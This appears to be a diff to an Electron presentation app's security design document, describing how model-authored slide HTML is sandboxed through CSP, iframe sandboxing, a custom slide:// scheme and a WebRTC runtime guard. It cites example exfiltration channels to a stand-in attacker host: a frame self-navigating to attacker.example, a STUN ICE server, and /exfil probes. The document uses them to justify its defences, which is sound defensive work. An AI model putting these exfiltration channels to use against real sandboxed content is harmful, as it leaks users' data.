@@ -381,8 +381,36 @@ It is contained at four layers.
 ```
 default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
 img-src 'self' data: blob:; font-src 'self' data:; connect-src 'self';
-frame-src blob:; object-src 'none'; base-uri 'none'; form-action 'none';
+frame-src blob: slide:; object-src 'none'; base-uri 'none'; form-action 'none';
 ```
+
+`frame-src` is the one directive M2.0 had to widen, and the one CSP decision `slide://` delivery does
+*not* escape: it governs the embedder's choice of what may be framed. It grants the slide nothing.
+`slide:` appears in no other directive — a unit test asserts exactly that, because listing it under
+`default-src` or `script-src` would let the *app* page load code from the scheme that serves
+model-generated documents.
+
+> **`frame-src` is containment, not just embedding (measured, M2.0).** It governs **every navigation
+> of a child frame**, not merely its initial `src`. That makes this list — and not anything in main —
+> what stops a *running* slide from exfiltrating by navigating itself to
+> `https://attacker.example/?d=<deck>`. Nothing on the slide's own policy covers that channel:
+> `connect-src 'none'` is about fetch/XHR/beacon, no shipped CSP directive governs a frame navigating
+> itself (`navigate-to` was specified and dropped), and the sandbox only withholds navigation of the
+> *top* frame.
+>
+> Proven both ways by [`slide-protocol-smoke.mjs`](../../../experiments/init/harness/slide-protocol-smoke.mjs)
+> probe 6, which points a slide at a real HTTP listener on loopback: nothing arrives as shipped, and
+> temporarily adding `http:` to `frame-src` makes `/exfil?d=deck-contents` land. So `frame-src` is a
+> **closed allow-list of the two delivery transports** and must stay one; a `*` or an `https:` added
+> here later would silently reopen the channel. `'self'` was removed from it in M2.0 for the same
+> reason — the app frames slides and nothing else, and it would have let a slide navigate its frame
+> to the app's own document.
+>
+> An Electron-side `will-frame-navigate` guard was written for this and then deleted: measurement
+> showed it does not fire for a renderer-initiated subframe navigation on Electron 43 (emitted for
+> the frame's initial `slide://` load, absent for its subsequent `http://` one, while
+> `did-start-navigation` saw both). Keeping a guard that never runs would have obscured the real
+> mechanism.
 
 Also in `hardening.ts`: `webContents.setWindowOpenHandler(() => ({action:'deny'}))`, a
 `will-navigate` guard that blocks any navigation away from the app origin, and
@@ -390,14 +418,16 @@ Also in `hardening.ts`: `webContents.setWindowOpenHandler(() => ({action:'deny'}
 the app session.
 
 **Layer 2 — the iframe.** Each slide renders in
-`<iframe sandbox="allow-scripts" referrerpolicy="no-referrer" allow="" src={blobUrl}>`.
+`<iframe sandbox="allow-scripts" referrerpolicy="no-referrer" allow="" src={slideUrl}>`.
 Critically **`allow-same-origin` is omitted**, so the frame is an opaque origin: it cannot read
 `window.parent`, cannot touch `localStorage`, cannot reach any app IPC. `allow-popups`,
 `allow-top-navigation`, `allow-forms`, `allow-modals` are all omitted too.
 
-Content is delivered as a **blob URL** rather than `srcdoc` (blob keeps the frame in its own opaque
-origin cleanly, gives DevTools a real document URL for Design Mode debugging, and avoids
-HTML-escaping the whole document into an attribute). Blob URLs are revoked when a slide unmounts.
+Content is delivered over a **URL** rather than `srcdoc` (a real navigation keeps the frame in its own
+opaque origin cleanly, gives DevTools a real document URL for Design Mode debugging, and avoids
+HTML-escaping the whole document into an attribute). As of M2.0 that URL is `slide://<id>/` under
+Electron and a blob URL in a plain-browser host; either way it is released when the slide unmounts or
+its html changes.
 
 > **Correction (M1.3, 2026-07-31) — blob does not escape CSP inheritance.**
 > This section was written on the assumption that a blob-loaded frame, unlike `srcdoc`, is governed
@@ -416,16 +446,45 @@ HTML-escaping the whole document into an attribute). Blob URLs are revoked when 
 >   worse than `srcdoc`.
 > - A slide document is governed by the *intersection* of the host policy and layer 3, so layer 3 is
 >   currently a second line of defence rather than the only one.
-> - **`capabilities: ["interactive-js"]` does not work today** — inline slide JS is blocked whatever
->   the local-scheme delivery. Static, CSS-animated and SMIL-animated slides are unaffected.
+> - **`capabilities: ["interactive-js"]` did not work** — inline slide JS was blocked whatever the
+>   local-scheme delivery. Static, CSS-animated and SMIL-animated slides were unaffected.
 > - Unblocking it requires a **non-local scheme**: register `slide://` with `protocol.handle` in the
 >   main process and serve slide documents from it. A non-local scheme does not inherit the policy
 >   container, so each slide gets a real per-document CSP — layer 3 becomes the only policy on the
 >   frame, which also raises the stakes on `wrapSlideHtml`'s anchor being exactly right. Tracked as
 >   an M2 prerequisite in [80-roadmap.md](80-roadmap.md).
 
+> **Resolved (M2.0) — `slide://` delivery ships.** Slides are served from a privileged custom scheme
+> registered with `protocol.registerSchemesAsPrivileged` (`standard`, `secure`; **not**
+> `supportFetchAPI`, `corsEnabled`, `bypassCSP` or `allowServiceWorkers`) and handled by
+> `protocol.handle` in `src/main/slide/protocol.ts`. Documents live in an in-memory registry keyed by
+> 128-bit CSPRNG ids — never filesystem paths, so the scheme has no path-traversal surface at all —
+> published and revoked by the renderer over the typed `slide:publish` / `slide:revoke` channels.
+>
+> Verified end-to-end in the real app on WSLg by
+> [`experiments/init/harness/slide-protocol-smoke.mjs`](../../../experiments/init/harness/slide-protocol-smoke.mjs):
+> the *same* slide document with the *same* inline `<script>` in the *same* `sandbox="allow-scripts"`
+> frame **runs** over `slide://` and stays **blocked** over `blob:`. `interactive-js` is unblocked.
+>
+> Consequences for this section:
+> - Layer 3 is now the **only** policy on the frame, so it is sent twice — as a
+>   `Content-Security-Policy` response header from main *and* as `wrapSlideHtml`'s injected `<meta>`.
+>   Neither is decorative; the header is what makes a missed injection survivable.
+> - Layer 2's sandbox attribute is now the sole thing between model-authored JS and the app. The
+>   smoke probe asserts containment from inside a *running* slide: `parent.document`,
+>   `parent.location`, `top.document`, `opener` and `parent.sloodge` are all unreachable and
+>   `localStorage` throws `SecurityError`. (Note that a sandboxed `slide://` frame nonetheless
+>   reports `location.origin` as `slide://<id>`, not `"null"` — Chromium derives that string from the
+>   URL for a `standard:` scheme even when the security origin is opaque. Cosmetic, but the reason
+>   the id is the URL host rather than a path segment.)
+> - The plain-browser fallback (evidence recorder, happy-dom unit tests) keeps blob delivery and
+>   therefore keeps the old limitation; the host gate is in
+>   `src/renderer/src/features/canvas/slideUrlFactory.ts`.
+
 **Layer 3 — the slide document's own CSP.** `src/renderer/features/canvas/wrapSlideHtml.ts`
-injects, as the first child of `<head>`, before any author content:
+injects immediately after the document's doctype, so the tree builder places it in the implied
+`<head>` ahead of all author content (it deliberately does *not* walk the markup looking for a
+literal `<head>` — see that module's docstring for the five review rounds that removed the walk):
 
 ```
 default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline';
@@ -433,11 +492,29 @@ img-src data: blob:; font-src data:; media-src data: blob:;
 connect-src 'none'; frame-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none';
 ```
 
-`connect-src 'none'` is the important one: a slide cannot phone home, exfiltrate deck content, or
-pull remote code. `'unsafe-inline'` for script/style is unavoidable (the whole point is inline
-model-authored `<script>`/`<style>`), but with `default-src 'none'` + no same-origin it buys the
-attacker nothing beyond their own opaque document. All assets are inlined as data URIs at document
-assembly time — see [30-slide-format.md](30-slide-format.md).
+`connect-src 'none'` is the important one for the channels CSP governs — fetch, XHR, WebSocket,
+EventSource, `sendBeacon`, and every subresource: with it a slide cannot phone home, exfiltrate deck
+content, or pull remote code through any of those. `'unsafe-inline'` for script/style is unavoidable
+(the whole point is inline model-authored `<script>`/`<style>`), but with `default-src 'none'` + no
+same-origin it buys the attacker nothing beyond their own opaque document. All assets are inlined as
+data URIs at document assembly time — see [30-slide-format.md](30-slide-format.md).
+
+> **CSP does not cover WebRTC — layer 3 is CSP *plus* a runtime guard (M2.0).** No CSP directive
+> governs WebRTC (`webrtc-src` was proposed and never shipped), so `connect-src 'none'` does nothing
+> to a slide that constructs `new RTCPeerConnection({iceServers:[{urls:'stun:attacker'}]})` —
+> measured, five real STUN Binding Requests left a running `slide://` slide onto a loopback UDP
+> socket, with the attacker controlling the ICE-server host (and, for TURN, `username`/`credential`)
+> as an exfiltration primitive. Before M2.0 this was unreachable, because inline slide JS did not
+> execute at all; making it execute is the milestone, and it opened this. It is closed by
+> `wrapSlideHtml`'s injected bootstrap (`SLIDE_RUNTIME_GUARD`), which defines `RTCPeerConnection`
+> (and its `webkit`/`moz` aliases, `RTCDataChannel`, and `WebTransport`) as non-configurable
+> `undefined` before author script runs. The `about:blank`-child-frame resurrection bypass fails
+> because `frame-src 'none'` forbids the frame and the slide's opaque origin makes any frame it
+> created opaque too; the Worker variant fails on `default-src 'none'`. Proven both ways by
+> [`slide-protocol-smoke.mjs`](../../../experiments/init/harness/slide-protocol-smoke.mjs) probe 7:
+> zero packets with the guard, real STUN packets with it reverted. So the "no network" guarantee is
+> CSP **and** the guard, not CSP alone; the other 22 channels swept (fetch/XHR/WebSocket/beacon/
+> subresources/self-navigation/window.open/nested frames/…) are all closed by CSP + `frame-src`.
 
 **Layer 4 — the host↔slide protocol.** The only channel is `window.postMessage` between the frame
 and `SlideFrame.tsx`, with:
